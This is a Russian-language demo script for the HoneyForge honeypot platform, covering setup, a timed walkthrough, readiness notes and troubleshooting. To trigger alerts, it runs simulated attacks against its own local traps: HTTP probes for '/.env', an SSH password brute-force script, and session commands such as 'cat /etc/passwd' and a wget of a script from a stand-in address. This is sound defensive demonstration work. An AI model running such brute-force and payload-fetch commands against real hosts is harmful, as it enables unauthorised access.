# Сценарий демо HoneyForge

Показ на защите: **5–7 минут**, путь «ловушка → атака → живая лента → Юми →
расследование → IoC». Всё ниже проверено на локальном стенде 15.10.2026
(Windows + Docker Desktop, main после PR #48). Основной вариант — настоящий
центр и настоящая Low-ловушка, по желанию с Medium (Cowrie SSH) ради алерта о
переборе; если стенд не поднимается — запасной вариант на моках (раздел 5), он
показывает весь интерфейс за 2 минуты подготовки.

## 1. Подготовка (за 30 минут до показа)

Все команды — для **Git Bash** (на Windows), из корня репозитория `neiroleptik`;
в PowerShell синтаксис переменных окружения и `/dev/tcp` другой. Нужны Docker
Desktop, Node.js 22.12+ (или 24, или 26+), Python 3.12 и `uv 0.11.28` (`python -m pip install --user uv==0.11.28`;
на Windows при ошибке установки Python задайте `UV_PYTHON_INSTALL_DIR` на
локальный диск, не OneDrive и не Roaming).

**Центр** (один раз; первый администратор создаётся интерактивно — README,
«Локальный запуск»):

```sh
docker compose --env-file .env -f infra/compose.center.yml up -d db
docker compose --env-file .env -f infra/compose.center.yml build api
docker compose --env-file .env -f infra/compose.center.yml run --rm api /app/.venv/bin/alembic upgrade head
docker compose --env-file .env -f infra/compose.center.yml up -d api
```

В Git Bash перед `run` задайте `MSYS_NO_PATHCONV=1`, иначе путь
`/app/.venv/bin/alembic` подменится путём Windows. Готовность:
`http://127.0.0.1:8000/readyz` → 200.

**Интерфейс на настоящем центре.** По умолчанию центр пускает только
`http://localhost:5173`; origin `http://127.0.0.1:5175` добавить вручную в `.env`
и пересоздать API, иначе запросы и WebSocket отклонятся (CORS):

```sh
# в .env, одной строкой (JSON-массив):
HF_ALLOWED_ORIGINS='["http://localhost:5173","http://localhost:8000","http://127.0.0.1:5175"]'
docker compose --env-file .env -f infra/compose.center.yml up -d api
```

Запуск фронта:

```sh
cd frontend
npm install
VITE_API_MOCK=0 VITE_EVENTS_ENABLED=1 VITE_INVESTIGATION_ENABLED=1 npx vite --host 127.0.0.1 --port 5175 --strictPort
```

В шапке должна быть метка «центр». Запись сессии, паспорт и сводка обзора на
сервере ещё не реализованы — их флаги (`VITE_REPLAY_ENABLED`,
`VITE_ANALYTICS_ENABLED`) и общий `VITE_TELEMETRY_ENABLED` не включаем.

**Образ Low и исполнитель:**

```sh
uv sync --frozen
docker build -f honeypots/low/Dockerfile -t honeyforge-low:local .
```

Регистрация узла — **заранее, не на проекторе**: войти как `admin` → «Парк» →
«+ Добавить хост» → скопировать токен (действует 15 минут, показывается один
раз). Каталог состояния агента — на локальном диске, вне OneDrive. Токен
никогда не вписывается в саму команду (иначе он останется в истории
терминала) — вводится скрыто:

```sh
read -rs HF_ENROLLMENT_TOKEN && export HF_ENROLLMENT_TOKEN   # вставить токен, Enter
uv run --frozen python -m agent.runtime.executor.enroll \
  --center http://127.0.0.1:8000 --allow-http-loopback --name demo-low \
  --token-file <каталог агента>/agent.token
unset HF_ENROLLMENT_TOKEN; clear
uv run --frozen python -m agent.runtime.executor --center http://127.0.0.1:8000 --allow-http-loopback \
  --token-file <каталог агента>/agent.token \
  --state <каталог агента>/executor/state.sqlite3 \
  --journal-root <каталог агента>/low \
  --image honeyforge-low:local --bind-address 127.0.0.1 --telemetry
```

`--telemetry` — исполнитель сам собирает журнал Low и отправляет события в
центр, ручные collect/deliver не нужны. Вывод исполнителя на экран не выводить:
в нём пути к файлу токена.

**Medium (Cowrie SSH) — по желанию, нужен для алерта о переборе.** Образ Cowrie
и отдельная docker-сеть собираются заранее:

```sh
docker build -f honeypots/medium/Dockerfile -t honeyforge-medium:local .
docker network create honeyforge-medium-local
```

Регистрация узла — как у Low, но с `--medium` (объявляет low и medium после
проверки образа оператором); исполнитель — с образом Medium, сетью и
телеметрией. На Windows `uv run` запускает Python под собой — команды агента
вызывать через `uv run --frozen python -m …`. Каталог Medium-агента —
**отдельный** от Low (два исполнителя работают одновременно; общий `agent.token`
и `state.sqlite3` они бы перезаписали друг у друга) и вне OneDrive:

```sh
read -rs HF_ENROLLMENT_TOKEN && export HF_ENROLLMENT_TOKEN   # токен нового хоста
uv run --frozen python -m agent.runtime.executor.enroll \
  --center http://127.0.0.1:8000 --allow-http-loopback --name demo-medium --medium \
  --token-file <каталог Medium-агента>/agent.token
unset HF_ENROLLMENT_TOKEN; clear
uv run --frozen python -m agent.runtime.executor --center http://127.0.0.1:8000 --allow-http-loopback \
  --token-file <каталог Medium-агента>/agent.token \
  --state <каталог Medium-агента>/executor/state.sqlite3 \
  --journal-root <каталог Medium-агента>/journals \
  --medium-image honeyforge-medium:local --network honeyforge-medium-local --telemetry
```

В «Профилях» создать Medium-профиль: один SSH-сервис, порт **2222**, баннер
**пустой** (свой баннер агент Medium пока не принимает — иначе ловушка уйдёт в
«ошибку»), учётка-приманка `root`/`demo`. Запустить Medium-ловушку на хосте
`demo-medium`. Каталоги `state` и `journals` между запусками не очищать.

**Перед показом проверить:**

- [ ] «Парк»: хост `demo-low` — «на связи».
- [ ] Старые хосты без связи отозваны («Отозвать»), чтобы не отвлекали.
- [ ] Низкоуровневый профиль (Low) есть в «Профилях».
- [ ] Если показываем Medium: образ `honeyforge-medium:local` собран, сеть
      `honeyforge-medium-local` создана, хост `demo-medium` на связи, Medium-профиль
      с пустым баннером и `root`/`demo` есть, Medium-ловушка «работает».
- [ ] Окно браузера шире 860 px (лучше ≥ 1280 px) — на узком окно Юми скрыто.
- [ ] Окно с токеном регистрации закрыто, терминал регистрации очищен.
- [ ] В интерфейс уже вошли заранее — пароль администратора на проекторе не вводить.
- [ ] Звук не нужен: Юми говорит текстом в консоли под листом.
- [ ] Открыт терминал с командами атаки (раздел 3), шрифт крупный.

## 2. Сценарий показа

Таблица ниже — базовый путь на Low, укладывается в 6 минут. Medium (строки с
пометкой 3a) добавляет ~1–2 минуты и выводит показ к 7–8 минутам: если времени в
обрез, показать перебор и алерт **на Medium вместо** Low-атаки (а не в
дополнение), либо сократить «Аудит» до одной фразы.

| Время | Что делаем | Что говорим и что видно |
|---|---|---|
| 0:00 | Уже открытый «Обзор» или «Парк» (вошли заранее) | «Пульт оператора ловушек. В шапке — источник данных: настоящий центр». Юми здоровается в консоли |
| 0:30 | «Парк» | Хост `demo-low` на связи; Low, Medium, High — уровни взаимодействия; команды только у оператора и админа |
| 1:00 | «+ Запустить ловушку» → хост `demo-low` → профиль Low → «Запустить» | Ход задания до «Запустить: успешно», состояние «работает». Юми: «Отправила команду…» → «Команда выполнена». Исполнитель поднял настоящий Docker-контейнер |
| 2:00 | Открыть «События» на втором мониторе или вкладке | Лента пустая или со старыми событиями, индикатор «онлайн» |
| 2:15 | В терминале — атака (раздел 3; для Medium ещё и 3a) | Строки появляются сверху **без перезагрузки** (WebSocket). Юми: «Новое подключение с …», «… шлёт HTTP-запрос GET», «… шлёт N байт по TCP». Атаку Medium (3a) запустить здесь же, чтобы к 4:00 алерт о переборе успел появиться |
| 3:15 | Разобрать строку события | Путь запроса скрыт («[скрыто]»), пометки «полнота захвата неизвестна; ответ не записан» — интерфейс не выдаёт неизвестное за известное. Пароли не выводятся никогда |
| 4:00 | «Расследование» → «Экспорт IoC» → «Скачать CSV» | По умолчанию последние 24 часа; файл с индикаторами (IP), ссылками на исходные события. Алерт о переборе паролей (≥ 5 неудачных входов за 60 с) — на Low не возникает (HTTP не пишет попытки входа); показать на Medium (раздел 3a) или в запасном варианте |
| 5:00 | «Парк» → «Остановить» | «Остановить: успешно», ловушка «остановлена»; исполнитель дочитал журнал |
| 5:30 | «Аудит» | Кто, что и когда сделал: вход, запуск, команда, подтверждение агентом |
| 6:00 | Итог | Что готово и что дальше (раздел 4) |

## 3. Команды атаки

Порты ловушки назначает исполнитель; узнать:

```sh
docker ps --filter "name=honeyforge-low" --format "{{.Ports}}"
```

Пример вывода: `127.0.0.1:12323->2222/tcp, 127.0.0.1:18080->8080/tcp`.
Подставить HTTP-порт (`18080`) и TCP-порт (`12323`):

```sh
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:18080/
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:18080/admin
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:18080/.env
curl -s -o /dev/null -w "%{http_code}\n" -X POST -d "user=admin&pass=admin123" http://127.0.0.1:18080/login
printf 'hello honeypot\r\n' | timeout 5 bash -c 'cat > /dev/tcp/127.0.0.1/12323'
```

События появляются в ленте через несколько секунд (исполнитель собирает журнал
проходами). Источник — адрес Docker NAT (`172.17.0.1`), а не реальный IP: на
Docker Desktop внешний адрес не виден, это ожидаемо и стоит проговорить.

### 3a. Атака на Medium (Cowrie SSH): перебор и вход

Если поднят Medium (см. раздел 1) — покажем попытки входа, команды и **алерт о
переборе**. Атака идёт по нашей же ловушке на `127.0.0.1:2222`. Шесть неверных
паролей подряд дают алерт, затем вход `root`/`demo` и несколько команд. `paramiko`
ставится временно через `uv run --with`:

```sh
uv run --with paramiko python - <<'PY'
import time, paramiko
H, P = '127.0.0.1', 2222
for pw in ['123456', 'password', 'admin', 'toor', 'qwerty', 'letmein']:
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try: c.connect(H, P, 'root', pw, timeout=10, allow_agent=False, look_for_keys=False)
    except paramiko.AuthenticationException: print(pw, 'отказ')
    finally: c.close()
    time.sleep(1)
c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(H, P, 'root', 'demo', timeout=10, allow_agent=False, look_for_keys=False)
sh = c.invoke_shell(); time.sleep(1.5); sh.recv(65535)
for cmd in ['whoami', 'uname -a', 'cat /etc/passwd', 'wget http://203.0.113.9/x.sh', 'ls -la /root']:
    sh.send(cmd + '\n'); time.sleep(1.5)
sh.send('exit\n'); time.sleep(1); c.close()
PY
```

В ленте: попытки входа (`auth.attempt`, пароль показан как «скрыт», не значением)
и команды сессии (`session.command`). В «Расследовании» — алерт `перебор паролей`.
Источник — адрес docker-сети Medium (например `172.20.0.1`), как и на Low.

## 4. Что честно сказать о готовности

- **Работает на настоящих данных:** профили и ревизии, парк, регистрация и
  отзыв хостов, команды с подтверждением агентом, живая лента событий Low
  (HTTP и TCP) и Medium (Cowrie SSH: попытки входа и команды), Юми,
  расследование (алерты, артефакты, медовые токены — по мере появления данных),
  экспорт IoC, аудит, роли. Алерт о переборе паролей (≥ 5 неудачных входов за
  60 с) виден на Medium — именно SSH пишет попытки входа.
- **Пока на моках / не реализовано на сервере:** запись сессии (replay),
  паспорт сессии и timeline, сводка обзора. Интерфейс для них готов и
  показывается в запасном варианте.
- **Не готово:** High-ловушки; Low HTTP не пишет попытки входа, поэтому алерт о
  переборе на Low не возникает (показываем на Medium). Сбор Low работает
  проходами (события через несколько секунд); изоляция Linux на локальном
  стенде не проверялась. У Medium свой SSH-баннер агент пока не поддерживает —
  в профиле баннер оставляем пустым.

## 5. Запасной вариант: демо на моках

Если центр или Docker не поднимаются — весь интерфейс на вымышленных данных:

```sh
cd frontend
npm install
VITE_API_MOCK=1 npx vite --port 5176
```

Входы: `operator`/`operator`, `admin`/`admin`, `viewer`/`viewer`. В шапке —
«демо-данные», в заголовке вкладки «[демо]» — проговорить, что это моки.
Показать то, чего ещё нет на сервере: каждые несколько секунд по WebSocket
приходит демо-атака (Юми реагирует), «Запись» у события открывает проигрыватель
сессии (пуск, скорость, перемотка; управляющие последовательности и ссылки
из вывода атакующего не исполняются), «Расследование» с алертом, медовым
токеном, артефактами и основанием по исходным событиям, роль наблюдателя без
кнопок изменения.

## 6. Если что-то пошло не так

| Симптом | Причина и действие |
|---|---|
| Хост «нет связи» | Исполнитель не запущен или упал — перезапустить командой из раздела 1 |
| «Запустить: истёк срок» | Команда ушла на хост без исполнителя — выбрать хост на связи |
| Лента «нет потока» | Не включён `VITE_EVENTS_ENABLED=1` или API без WebSocket — перезапустить фронт с флагом |
| Событий нет после атаки | Подождать 5–10 с; в выводе исполнителя должно быть `delivered:N` |
| Нет пиксельного шрифта | Старый main: подтянуть main (шрифты лежат в репозитории с PR #37) |
| Окно Юми не видно | Окно браузера 860 px или уже, либо нет WebGL — расширить окно; без WebGL Юми говорит в консоли |
| Вход или лента не работают, в консоли браузера CORS | Нет `http://127.0.0.1:5175` в `HF_ALLOWED_ORIGINS` — добавить и `up -d api` |
| Регистрация: «токен недействителен или истёк» | Прошло больше 15 минут или токен уже использован — выдать новый в «+ Добавить хост» |
| Medium-ловушка сразу в «ошибке» (профиль не поддерживается этим хостом / SSH-баннер) | В профиле задан SSH-баннер — очистить поле баннера и запустить ловушку заново |
| Medium: «Один из портов уже зарезервирован на этом узле» | Прежняя ловушка держит порт 2222. Если в парке есть «Удалить» (у остановленной/ошибочной) — удалить и создать заново; иначе отозвать хост и зарегистрировать новый, либо запустить на другом хосте |
| Атака на Medium молчит | Проверить, что ловушка «работает» и порт 2222 слушается (`docker ps --filter name=honeyforge-medium`); подождать несколько секунд — журнал собирается проходами |
| Фронт не стартует: порт 5175 занят | Остановить прежний `vite` (процесс node) или выбрать другой порт и добавить его в `HF_ALLOWED_ORIGINS` |
| Всё сломалось | Переключиться на запасной вариант (раздел 5) |
